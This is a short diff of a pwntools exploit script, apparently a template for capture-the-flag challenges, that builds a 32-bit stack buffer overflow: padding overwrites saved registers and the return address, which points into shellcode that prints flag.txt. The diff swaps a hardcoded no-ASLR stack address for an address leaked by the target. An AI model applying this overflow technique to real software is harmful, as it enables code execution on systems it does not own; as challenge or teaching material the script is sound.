@@ -1,19 +1,19 @@
 from pwn import *
 
 gen_filename = ""
+gen_templates = {}
 
 e = ELF(gen_filename)
-p = process([], env={}, executable=gen_filename, aslr=False)
+p = e.process()
 
-# this assumes no aslr
-stack_base = 0xfff00000
-buff = stack_base + 0xfde20
+B = gen_templates["B"]
+buff = int(p.readline().strip(), 16)
 
 payload = b''
-payload += 64 * b'a'  # buffer
-payload +=  4 * b'b'  # ebp
-payload +=  4 * b'c'  # ebx
-payload +=  4 * b'd'  # padding
+payload += B * b'a'   # buffer
+payload += 4 * b'b'   # ebp
+payload += 4 * b'c'   # ebx
+payload += 4 * b'd'   # padding
 dest = buff + len(payload) + 4
 payload += p32(dest)  # eip
 shellcode = shellcraft.i386.linux.cat("flag.txt") + shellcraft.i386.linux.exit(0)
